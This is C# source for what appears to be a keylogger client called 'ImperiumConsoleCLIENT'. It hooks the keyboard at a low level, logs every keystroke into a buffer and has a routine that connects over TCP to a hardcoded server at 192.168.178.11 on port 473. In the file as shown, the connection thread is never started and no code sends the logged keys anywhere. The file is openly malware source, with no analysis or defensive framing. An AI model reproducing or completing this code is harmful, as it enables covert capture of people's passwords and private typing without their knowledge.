using ImperiumLibrary.User.Monitor.Keyhook;
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ImperiumConsoleCLIENT
{
    class Program
    {
        static ConsoleEventDelegate handler;
        private delegate bool ConsoleEventDelegate(int eventType);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);

        private static LowLevelKeyboardListener Listener = new LowLevelKeyboardListener();
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        static void Main(string[] args)
        {
            Thread Connect = new Thread(new ThreadStart(ConnectToServer));
            if (Variables.EnableKeylogger)
            {
                CollectLogs();
            }
            handler = new ConsoleEventDelegate(ConsoleEventCallback);
            SetConsoleCtrlHandler(handler, true);
            Application.Run();
        }

        private static void CollectLogs()
        {
            Variables.KeystrokeLogs = new System.Text.StringBuilder();
            Listener.HookKeyboard();
            Listener.OnKeyPressed += _listener_OnKeyPressed;
        }

        private static void _listener_OnKeyPressed(object sender, KeyPressedArgs e)
        {
            bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
            if (CapsLock)
            {
                Variables.KeystrokeLogs.Append(e.KeyPressed.ToString().ToUpper());
                Console.WriteLine(e.KeyPressed.ToString().ToUpper());
            }
            else
            {
                Variables.KeystrokeLogs.Append(e.KeyPressed.ToString().ToLower());
                Console.WriteLine(e.KeyPressed.ToString().ToLower());
            }

        }

        static bool ConsoleEventCallback(int eventType)
        {
            if (eventType == 2)
            {
                Console.WriteLine("Unhooking keyboard");
                Listener.UnHookKeyboard();
            }
            return false;
        }
        private static void ConnectToServer()
        {
            Variables.TCPClient = new TcpClient();
            Variables.Port = 473;
            Variables.ConnectTo = "192.168.178.11";
            bool IsIPAddress = IPAddress.TryParse(Variables.ConnectTo, out Variables.IPAddress);
            switch (IsIPAddress)
            {
                case true:
                    Variables.IPAddress = IPAddress.Parse(Variables.ConnectTo);
                    break;
                case false:
                    Variables.IPAddress = Dns.GetHostAddresses(Variables.ConnectTo)[0];
                    break;
            }
            try
            {
                do
                {
                    Variables.TCPClient.Connect((Variables.IPAddress), Variables.Port);
                } while (Variables.TCPClient.Connected != true);
            }
            catch (Exception)
            {
                Thread.Sleep(2500);
            }
        }
    }
}
